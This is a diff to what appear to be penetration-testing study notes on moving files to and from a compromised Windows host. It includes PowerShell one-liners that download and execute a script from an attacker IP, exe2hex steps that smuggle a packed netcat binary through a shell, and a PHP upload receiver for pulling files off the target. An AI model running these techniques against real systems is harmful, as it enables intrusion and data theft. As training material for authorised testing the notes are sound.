@@ -66,3 +66,33 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/
 powershell.exe "IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')"
 ```
 
+### Windows Downloads with exe2hex and PowerShell
+
+Starting on our Kali machine, we will compress the binary we want to transfer, convert it to a hex string, and embed it into a Windows script.   
+On the Windows machine, we will paste this script into our shell and run it. It will redirect the hex data into powershell.exe , which will assemble it back into a binary.   
+This will be done through a series of non-interactive commands. As an example, let’s use powershell.exe to transfer Netcat from our Kali Linux machine to our Windows client over a remote shell.
+
+```text
+cp /usr/share/windows-resources/binaries/nc.exe .
+upx -9 nc.exe
+exe2hex -x nc.exe -p nc.cmd
+```
+
+When we copy and paste this script into a shell on our Windows machine and run it, we can see that it does, in fact, create a perfectly-working copy of our original nc.exe.
+
+```text
+COPY content of nc.cmd to notepad and run with powershell
+```
+
+### Windows Uploads Using Windows Scripting Languages
+
+create the following PHP script and save it as `upload.php` in our Kali webroot directory,`/var/www/html`:
+
+```text
+<?php
+$uploaddir = '/var/www/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+```
+
